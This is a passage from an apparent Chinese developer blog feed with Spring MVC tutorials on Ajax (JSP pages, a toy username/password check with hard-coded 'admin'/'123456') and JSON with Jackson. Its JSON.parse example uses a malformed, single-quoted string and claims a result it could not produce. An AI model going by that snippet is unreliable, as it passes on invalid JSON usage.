class="tag">&lt;<span class="name">data.length;i++)&#123;</span></span></span></span><br><span class="line"><span class="xml">                       html += "<span class="tag">&lt;<span class="name">tr</span>&gt;</span>" +</span></span><br><span class="line"><span class="xml">                       "<span class="tag">&lt;<span class="name">td</span>&gt;</span>"+data[i].name+"<span class="tag">&lt;/<span class="name">td</span>&gt;</span>"+</span></span><br><span class="line"><span class="xml">                       "<span class="tag">&lt;<span class="name">td</span>&gt;</span>"+data[i].age+"<span class="tag">&lt;/<span class="name">td</span>&gt;</span>"+</span></span><br><span class="line"><span class="xml">                       "<span class="tag">&lt;<span class="name">td</span>&gt;</span>"+data[i].sex+"<span class="tag">&lt;/<span class="name">td</span>&gt;</span>"+</span></span><br><span class="line"><span class="xml">                       "<span class="tag">&lt;/<span class="name">tr</span>&gt;</span>"</span></span><br><span class="line"><span class="xml">                   &#125;</span></span><br><span class="line"><span class="xml">                   $("#content").html(html);</span></span><br><span class="line"><span class="xml">               &#125;)</span></span><br><span class="line"><span class="xml">           &#125;)</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>点击获取数据后，对应的地方会更新数据，这个地方由于是举例，没有使用数据库，所以修改的时候比较麻烦，如果连接数据库，数据库中对应的数据更新时，ajax2.jsp中对应的值也会跟着改变而不用刷新界面</p>
<p>还有常见的验证用户名和密码的操作<br>修改Controller<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">package com.ceit.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.pojo.<span class="keyword">User</span>;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">@RequestMapping("/ajax")</span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> AjaxController &#123;</span><br><span class="line">    //第一种方式，服务器返回一个字符串，直接使用response</span><br><span class="line">    @RequestMapping("/a1")</span><br><span class="line">    <span class="built_in">public</span> <span class="type">void</span> ajax(String <span class="type">name</span>, HttpServletResponse httpServletResponse) throws IOException &#123;</span><br><span class="line">        <span class="keyword">if</span>("admin".equals(<span class="type">name</span>))&#123;</span><br><span class="line">            httpServletResponse.getWriter().println("ture");</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            httpServletResponse.getWriter().println("false");</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping("/a2")</span><br><span class="line">    @ResponseBody</span><br><span class="line">    <span class="built_in">public</span> List&lt;<span class="keyword">User</span>&gt; ajax2()&#123;</span><br><span class="line">        ArrayList&lt;<span class="keyword">User</span>&gt; list = <span class="built_in">new</span> ArrayList&lt;<span class="keyword">User</span>&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">User</span> user1 = <span class="built_in">new</span> <span class="keyword">User</span>("弔弔1",<span class="number">3</span>,"男");</span><br><span class="line">        <span class="keyword">User</span> user2 = <span class="built_in">new</span> <span class="keyword">User</span>("弔弔2",<span class="number">3</span>,"男");</span><br><span class="line">        <span class="keyword">User</span> user3 = <span class="built_in">new</span> <span class="keyword">User</span>("弔弔3",<span class="number">3</span>,"男");</span><br><span class="line">        <span class="keyword">User</span> user4 = <span class="built_in">new</span> <span class="keyword">User</span>("弔弔4",<span class="number">3</span>,"男");</span><br><span class="line">        <span class="keyword">User</span> user5 = <span class="built_in">new</span> <span class="keyword">User</span>("弔弔5",<span class="number">3</span>,"男");</span><br><span class="line"></span><br><span class="line">        list.<span class="keyword">add</span>(user1);</span><br><span class="line">        list.<span class="keyword">add</span>(user2);</span><br><span class="line">        list.<span class="keyword">add</span>(user3);</span><br><span class="line">        list.<span class="keyword">add</span>(user4);</span><br><span class="line">        list.<span class="keyword">add</span>(user5);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> list; //由于加了@ResponseBody 他会返回一个字符串</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping("/a3")</span><br><span class="line">    @ResponseBody</span><br><span class="line">    <span class="built_in">public</span> String ajax3(String <span class="type">name</span>,String pwd)&#123;</span><br><span class="line">        String msg = "";</span><br><span class="line">        <span class="keyword">if</span>(<span class="type">name</span>!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>("admin".equals(<span class="type">name</span>))&#123;</span><br><span class="line">                msg = "ok";</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                msg = "用户名有误";</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(pwd!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>("123456".equals(pwd))&#123;</span><br><span class="line">                msg = "ok";</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                msg = "密码有误";</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>对应的ajax3.jsp<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">  Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="ruby">  <span class="symbol">User:</span> songf</span></span><br><span class="line"><span class="ruby">  <span class="symbol">Date:</span> <span class="number">2021</span>/<span class="number">3</span>/<span class="number">10</span></span></span><br><span class="line"><span class="ruby">  <span class="symbol">Time:</span> <span class="number">19</span><span class="symbol">:</span><span class="number">17</span></span></span><br><span class="line"><span class="ruby">  To change this template use File <span class="params">| Settings |</span> File Templates.</span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;pageContext.request.contextPath&#125;/static/js/jquery-3.6.0.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">        function a1() &#123;</span></span><br><span class="line"><span class="xml">            $.post(&#123;</span></span><br><span class="line"><span class="xml">                url:"$&#123;pageContext.request.contextPath&#125;/ajax/a3",</span></span><br><span class="line"><span class="xml">                data:&#123;"name":$("#name").val()&#125;,</span></span><br><span class="line"><span class="xml">                success:function (data) &#123;</span></span><br><span class="line"><span class="xml">                    if(data.toString()=="ok")&#123; //信息核对成功</span></span><br><span class="line"><span class="xml">                        $('#userInfo').css("color","green");</span></span><br><span class="line"><span class="xml">                    &#125;else&#123;</span></span><br><span class="line"><span class="xml">                        $('#userInfo').css("color","red");</span></span><br><span class="line"><span class="xml">                    &#125;</span></span><br><span class="line"><span class="xml">                    $("#userInfo").html(data)</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;)</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">        function a2() &#123;</span></span><br><span class="line"><span class="xml">            $.post("$&#123;pageContext.request.contextPath&#125;/ajax/a3",&#123;"pwd":$("#pwd").val()&#125;,function (data) &#123;</span></span><br><span class="line"><span class="xml">                if(data.toString()=="ok")&#123; //信息核对成功</span></span><br><span class="line"><span class="xml">                    $('#pwdInfo').css("color","green");</span></span><br><span class="line"><span class="xml">                &#125;else&#123;</span></span><br><span class="line"><span class="xml">                    $('#pwdInfo').css("color","red");</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">                $("#pwdInfo").html(data)</span></span><br><span class="line"><span class="xml">            &#125;)</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">    用户名:</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"name"</span> <span class="attr">onblur</span>=<span class="string">"a1()"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"userInfo"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">    密码:</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"pwd"</span> <span class="attr">onblur</span>=<span class="string">"a2()"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"pwdInfo"</span> &gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>输入账号不为admin时 会显示用户名错误 为admin时 页面不用刷新 会显示ok<br>密码同理</p>
<p><a href="/download/Ajax.zip">源码下载</a></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>前端开发</category>
        <category>Ajax</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JSON快速入门-2021/3/9</title>
    <url>/2021/03/09/JSON%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8-2021-3-9/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="Web-1-0-时代"><a href="#Web-1-0-时代" class="headerlink" title="Web 1.0 时代"></a>Web 1.0 时代</h2><p>早期网站，登录，如果失败，需要刷新页面，才能重新登录；不点击提交按钮，就不知道自己密码输错了</p>
<p>现在大多数的网站，都是局部刷新，不刷新整个页面的情况下，实现页面更新</p>
<p>注册的时候，发现手机号已经注册过了，但是你只是输入了，没有提交，然后他就提示了手机号已存在</p>
<h2 id="Web-2-0-时代"><a href="#Web-2-0-时代" class="headerlink" title="Web 2.0 时代"></a>Web 2.0 时代</h2><p>最重要的一个因素就是Ajax</p>
<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>JSON是一种轻量级的数据交换格式，目前使用极其广泛</p>
<p>在JS语言中，一切都是对象，因此，任何JS支持的类型都可以通过JSON来表示，例如字符串，数字，对象，数组等。语法格式要求：</p>
<ul>
<li>对象表示为键值对</li>
<li>数据由逗号分隔</li>
<li>花括号保存对象</li>
<li>方括号保存数组</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"QinJiang"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"age"</span>:<span class="string">"3"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"sex"</span>:<span class="string">"男"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>JSON是JS对象的字符串表示法，它使用文本表示一个JS对象的信息，本质是一个字符串<br><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;a:<span class="string">'hello'</span>,b:<span class="string">'world'</span>&#125;;  <span class="comment">//这是一个对象</span></span><br><span class="line"><span class="keyword">var</span> json = <span class="string">'&#123;a:'</span>hello<span class="string">',b:'</span>world<span class="string">'&#125;'</span>;  <span class="comment">//这是JSON字符串</span></span><br></pre></td></tr></table></figure></p>
<h2 id="JSON和JS互转"><a href="#JSON和JS互转" class="headerlink" title="JSON和JS互转"></a>JSON和JS互转</h2><p>实现JSON转JS对象，使用JSON.parse()方法<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var obj</span> = JSON.parse(<span class="string">'&#123;a:'</span>hello<span class="string">',b:'</span>world<span class="string">'&#125;'</span>) ;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attribute">a</span>:<span class="string">'hello'</span>,b:<span class="string">'world'</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>实现JS对象转JSON，使用JSON。stringify()方法<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var json</span> = JSON.stringify(&#123;a:<span class="string">'hello'</span>,b:<span class="string">'world'</span>&#125;);</span><br></pre></td></tr></table></figure></p>
<p>JSON1.html<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//编写一个对象</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> user = &#123;</span></span><br><span class="line"><span class="actionscript">            name:<span class="string">"s1nd0re1"</span>,</span></span><br><span class="line">            age:21,</span><br><span class="line"><span class="actionscript">            sex:<span class="string">"男"</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="actionscript">        <span class="comment">//输出这个对象</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(user);</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//将js对象转换成json对象</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(user);</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//输出这个json字符串</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(json);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> obj = <span class="built_in">JSON</span>.parse(json);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(obj)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>创建一个web application项目<br>创建springmvc的配置文件<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:tx</span>=<span class="string">"http://www.springframework.org/schema/tx"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span> <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">                    http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">                    http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">                    http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">                    http://www.springframework.org/schema/tx</span></span></span><br><span class="line"><span class="tag"><span class="string">                    http://www.springframework.org/schema/tx/spring-tx.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">                    http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="tag"><span class="string">                    http://www.springframework.org/schema/aop/spring-aop.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ceit.controller"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span> <span class="attr">id</span>=<span class="string">"internalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/jsp/"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>创建User实体类<br><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.experimental.Accessors;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Accessors</span>(chain = <span class="literal">true</span>)</span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编写控制器 UserController<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(<span class="meta-string">"/json1"</span>)</span></span><br><span class="line">    <span class="comment">//我们正常返回会走视图解析器，而jso返回的是一个字符串</span></span><br><span class="line">    <span class="comment">//市面上有很多的第三方jar包可以实现这个功能，jackson  只需要一个简单的注解就可以实现了</span></span><br><span class="line">    <span class="meta">@ResponseBody</span>  <span class="comment">//将服务器端返回的对象转换为json对象响应回去</span></span><br><span class="line">    <span class="keyword">public</span> String json1() throws JsonProcessingException &#123;</span><br><span class="line">        <span class="comment">//需要一个jackson的对象映射器，就是一个类，使用它可以直接将对象转换为json字符串</span></span><br><span class="line">        ObjectMapper objectMapper = new ObjectMapper();</span><br><span class="line">        <span class="comment">// 创建一个对象</span></span><br><span class="line">        User user = new User(<span class="string">"51nd0re1"</span>,<span class="number">21</span>,<span class="string">"男"</span>);</span><br><span class="line">        System.<span class="keyword">out</span>.println(user);</span><br><span class="line">        <span class="comment">//将Java对象转换为json字符串</span></span><br><span class="line">        String str = objectMapper.writeValueAsString(user);</span><br><span class="line">        System.<span class="keyword">out</span>.println(str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> str; <span class="comment">//由于使用了@ResponseBody  这里会将str以json格式的字符串返回，十分方便</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>访问/json1就可以了 但是由于编码问题前端会出现乱码<br>可以在@RequestMapping添加produces </p>
<p>最方便的就是修改配置文件<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span> <span class="attr">register-defaults</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.StringHttpMessageConverter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.json.MappingJackson2HttpMessageConverter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"objectMapper"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.json.Jackson2ObjectMapperFactoryBean"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"failOnEmptyBeans"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure><br>就可以修改成默认utf-8</p>
<p>UserController.java<br><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">package com.ceit.controller;</span><br><span class="line"></span><br><span class="line">import com.ceit.pojo.User;</span><br><span class="line">import com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line">import com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.<span class="keyword">annotation</span>.<span class="title">RequestMapping</span>;</span><br><span class="line">import org.springframework.web.bind.<span class="keyword">annotation</span>.<span class="title">ResponseBody</span>;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> &#123;</span></span><br><span class="line">    @RequestMapping(value = <span class="string">"/json2"</span>)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String json2() throws JsonProcessingException &#123;</span><br><span class="line">        User user = new User(<span class="string">"51nd0re1"</span>, <span class="number">21</span>, <span class="string">"男"</span>);</span><br><span class="line">        <span class="keyword">return</span> new ObjectMapper().writeValueAsString(user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"51nd0re1"</span>,<span class="attr">"age"</span>:<span class="number">21</span>,<span class="attr">"sex"</span>:<span class="string">"男"</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>还可以用来显示时间 返回的是时间戳的格式:1615286246602<br><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">package com.ceit.controller;</span><br><span class="line"></span><br><span class="line">import com.ceit.pojo.User;</span><br><span class="line">import com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line">import com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.<span class="keyword">annotation</span>.<span class="title">RequestMapping</span>;</span><br><span class="line">import org.springframework.web.bind.<span class="keyword">annotation</span>.<span class="title">ResponseBody</span>;</span><br><span class="line"></span><br><span class="line">import java.util.Date;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> &#123;</span></span><br><span class="line">    @RequestMapping(value = <span class="string">"/time1"</span>)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String json3() throws JsonProcessingException &#123;</span><br><span class="line">        Date date = new Date();</span><br><span class="line">        <span class="keyword">return</span> new ObjectMapper().writeValueAsString(date);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这样显示时间很不方便<br><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">package com.ceit.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.DateFormat;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line">@<span class="type">Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    @<span class="type">RequestMapping</span>(value = <span class="string">"/time2"</span>)</span><br><span class="line">    @<span class="type">ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> json5() <span class="keyword">throws</span> <span class="type">JsonProcessingException</span> &#123;</span><br><span class="line">        <span class="type">ObjectMapper</span> mapper = new <span class="type">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.如何让他不返回时间戳:关闭时间戳功能</span></span><br><span class="line">        mapper.configure(<span class="type">SerializationFeature</span>.<span class="type">WRITE_DATES_AS_TIMESTAMPS</span>,<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//2.时间格式化问题</span></span><br><span class="line">        <span 